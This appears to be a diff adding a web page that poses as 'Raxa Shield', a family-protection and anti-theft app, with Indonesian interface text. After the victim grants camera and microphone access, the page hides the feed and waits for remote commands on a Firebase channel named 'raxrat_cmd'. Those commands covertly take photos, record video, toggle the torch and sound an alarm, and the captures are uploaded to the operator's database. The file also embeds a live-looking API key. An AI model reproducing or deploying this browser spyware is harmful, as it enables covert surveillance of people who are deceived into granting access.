@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RAXASHIELD - TARGET SYSTEM</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <style>
+        body { background: #f0f4f8; font-family: sans-serif; margin: 0; overflow: hidden; }
+        /* Overlay Izin Gede */
+        #permission-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(26, 115, 232, 0.98); color: white;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            z-index: 9999; text-align: center; padding: 20px; box-sizing: border-box;
+        }
+        .shield-icon { font-size: 80px; margin-bottom: 20px; }
+        .btn-start {
+            background: #fff; color: #1a73e8; border: none; padding: 20px 40px;
+            font-size: 18px; font-weight: bold; border-radius: 50px; cursor: pointer;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.2); transition: 0.3s;
+        }
+        .btn-start:active { transform: scale(0.95); }
+        #main-content { padding-top: 100px; text-align: center; display: none; }
+    </style>
+</head>
+<body>
+
+    <div id="permission-overlay">
+        <div class="shield-icon">🛡️</div>
+        <h2>RAXA SHIELD SECURITY</h2>
+        <p>Klik tombol di bawah untuk mengaktifkan fitur perlindungan anti-maling dan pelacakan keluarga.</p>
+        <br>
+        <button class="btn-start" onclick="startSystem()">AKTIFKAN PERLINDUNGAN</button>
+        <p style="font-size: 10px; margin-top: 20px; opacity: 0.8;">Verifikasi Enkripsi v3.1.0 - Raxa Dev</p>
+    </div>
+
+    <div id="main-content">
+        <h1 style="color: #1a73e8;">Sistem Terproteksi</h1>
+        <p id="msg">Menunggu perintah dari Admin...</p>
+        <div id="status-blink" style="width: 15px; height: 15px; background: #34a853; border-radius: 50%; display: inline-block; animation: blink 1s infinite;"></div>
+    </div>
+
+    <video id="v" width="1" height="1" autoplay playsinline style="opacity:0;"></video>
+    <canvas id="c" style="display:none;"></canvas>
+    <audio id="al" src="https://www.soundjay.com/buttons/beep-01a.mp3" loop></audio>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBo9ysomUHUZfQtvsHRZgqxf_D3sTk_5Sg",
+            databaseURL: "https://raxakeamanankeluarga-default-rtdb.asia-southeast1.firebasedatabase.app/"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        let track;
+        let recorder;
+        let chunks = [];
+
+        async function startSystem() {
+            try {
+                // 1. Minta Izin Kamera & Mic
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "environment" }, 
+                    audio: true 
+                });
+                
+                document.getElementById('v').srcObject = stream;
+                track = stream.getVideoTracks()[0];
+                
+                // 2. Setup Recorder
+                recorder = new MediaRecorder(stream);
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.onstop = () => {
+                    const blob = new Blob(chunks, {type: 'video/webm'});
+                    const reader = new FileReader();
+                    reader.readAsDataURL(blob);
+                    reader.onloadend = () => {
+                        db.ref('hasil_vid').set({ data: reader.result, t: Date.now() });
+                    }
+                    chunks = [];
+                };
+
+                // 3. Unmute Audio (Penting buat Alarm)
+                document.getElementById('al').play().then(() => {
+                    document.getElementById('al').pause(); // Play terus Pause buat pancing izin browser
+                });
+
+                // 4. Sembunyikan Overlay
+                document.getElementById('permission-overlay').style.display = 'none';
+                document.getElementById('main-content').style.display = 'block';
+                
+                listenCommand(); // Mulai dengerin perintah
+                
+            } catch (err) {
+                alert("Wajib klik 'Izinkan' agar sistem keamanan bisa berjalan!");
+            }
+        }
+
+        function listenCommand() {
+            db.ref('raxrat_cmd').on('value', (snap) => {
+                const cmd = snap.val()?.command;
+                if(!cmd) return;
+                document.getElementById('msg').innerText = "Aksi Terakhir: " + cmd;
+
+                // ALARM
+                if(cmd === "ALARM_ON") document.getElementById('al').play();
+                if(cmd === "ALARM_OFF") document.getElementById('al').pause();
+
+                // SENTER (WEB TORCH)
+                if(cmd === "SENTER_ON" && track) track.applyConstraints({advanced: [{torch: true}]});
+                if(cmd === "SENTER_OFF" && track) track.applyConstraints({advanced: [{torch: false}]});
+
+                // FOTO
+                if(cmd === "FOTO_DEPAN") {
+                    const c = document.getElementById('c');
+                    const v = document.getElementById('v');
+                    c.width = 640; c.height = 480;
+                    c.getContext('2d').drawImage(v, 0, 0, 640, 480);
+                    db.ref('hasil_foto').set({ img: c.toDataURL('image/jpeg'), t: Date.now() });
+                }
+
+                // VIDEO 10S
+                if(cmd === "VID_10S") {
+                    recorder.start();
+                    setTimeout(() => recorder.stop(), 10000);
+                }
+            });
+        }
+    </script>
+    <style>@keyframes blink { 0% {opacity:1;} 50% {opacity:0.3;} 100% {opacity:1;} }</style>
+</body>
+</html>
